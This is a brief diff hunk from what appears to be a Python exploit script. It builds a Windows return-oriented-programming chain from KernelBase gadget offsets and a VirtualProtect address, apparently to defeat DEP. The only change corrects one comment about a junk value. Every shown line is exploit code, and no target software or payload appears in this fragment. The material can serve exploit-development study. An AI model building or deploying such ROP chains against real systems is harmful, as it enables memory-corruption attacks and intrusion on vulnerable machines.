@@ -52,7 +52,7 @@ def main():
     rop += pack("<L",(0x10406154)) # VirtualProtect for and operation
     rop += pack("<L",(BaseAddrKernelBase+0xf864c)) # 0x100f864c: and ecx, esi ; pop esi ; mov eax, ecx ; pop ebx ; retn 0x0004 
     rop += pack("<L",(0x42424242)) # Junk for esi
-    rop += pack("<L",(0x42424242)) # retn for ebx
+    rop += pack("<L",(0x42424242)) # junk for ebx
     rop += pack("<L",(BaseAddrKernelBase+0x187f21)) # #0x10187f21: mov ecx,  [ecx] ; mov eax, ecx ; ret ; (1 found) # KernelBase
     rop += pack("<L",(0x42424242)) # junk for retn 0x0004
     rop += pack("<L",(BaseAddrKernelBase+0x1c14e6)) # 0x101c14e6: push esp ; pop esi ; ret ; (1 found
